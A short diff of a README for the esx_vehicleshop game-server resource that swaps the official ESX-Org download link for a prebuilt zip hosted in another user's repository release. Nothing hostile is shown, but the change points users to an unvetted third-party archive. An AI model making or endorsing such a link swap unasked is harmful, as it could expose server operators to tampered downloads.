@@ -18,7 +18,7 @@
 
 ## Download & Installation
 ### Manually
-- Download https://github.com/ESX-Org/esx_vehicleshop/archive/master.zip
+- Download https://github.com/godday147/esx_vehicleshop/releases/download/1.0/esx_vehicleshop.zip
 - Put it in the `[esx]` directory
 
 ## Installation
